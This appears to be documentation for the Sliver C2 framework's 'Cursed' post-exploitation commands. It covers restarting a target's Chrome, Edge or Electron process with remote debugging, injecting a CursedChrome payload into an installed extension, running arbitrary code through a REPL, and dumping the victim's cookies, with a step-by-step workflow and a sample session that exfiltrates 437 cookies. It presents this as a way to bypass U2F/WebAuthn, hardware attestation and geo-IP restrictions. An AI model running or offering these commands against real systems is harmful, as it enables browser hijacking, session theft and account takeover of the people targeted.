Cursed is a Chrome/Chromium/Edge/Electron post-exploitation tool kit introduced in Sliver v1.5.25, which integrates with [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome) (originally [Sliver Overlord](https://github.com/BishopFox/sliver-overlord)). It can automatically find existing Chrome Extensions with the required permissions for [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome) and remotely inject it onto the target system, or you can start an interactive REPL to inject arbitrary code into any Chrome/Chromium/Edge/Electron context.

Since web requests and other activity originate from the target machine/browser instance, Cursed Chrome and the Cursed tool kit are excellent options for bypassing U2F/Webauthn, hardware attestation, and geo-IP restrictions in web applications.

## Cursed Chrome

The `cursed chrome` command can be used to restart a remote system's Chrome browser with remote debugging enabled. If no payload is specified using `--payload` the command will simply restart Chrome with remote debugging enabled, you can then use `cursed console` to interact with any debug target.

If a payload is specified, the command will restart Chrome with remote debugging, enumerate installed browser extensions, determine if any extension has the required permissions for [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome), and inject the payload into the extension's execution context.

So a typical workflow looks like:

1. Setup [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome)
2. Pop Sliver session, or go interactive from a beacon
3. `cursed chrome --payload background.js`
4. Upstream browser to CursedChrome proxy
5. Enjoy!

## Cursed Edge

Works identically to `cursed chrome` but the UI displays "Edge" instead of "Chrome" much like Edge itself.

## Cursed Electron

The `cursed electron` command can be used to restart an Electron application with remote debugging enabled, you can subsequently use `cursed console` to interact with any debug target. Note that some Electron applications disable the remote debugging functionality, which will prevent this feature from working.

## Cursed Console

The `cursed console` command can be used to start an interactive REPL with any cursed process. You will need to start a cursed process using `cursed chrome`, `cursed edge`, or `cursed electron` before using `cursed console`. You can list cursed processes using the `cursed` command. ![cursed](/images/cursed-1.png)

## Cursed Cookies

Starting in v1.5.28 the `cursed cookies` command can be used to dump a remote cursed process' cookies to a local file (newline delimited json), for example:

```
[server] sliver (CHRONIC_GOAT) > cursed chrome

...

[server] sliver (CHRONIC_GOAT) > cursed cookies

? Select a curse: 44199  [Session 56a5cd6f]  /Applications/Google Chrome.app/Contents/MacOS/Google Chrome

[*] Successfully dumped 437 cookies
[*] Saved to cookies-20220925182151.json

```
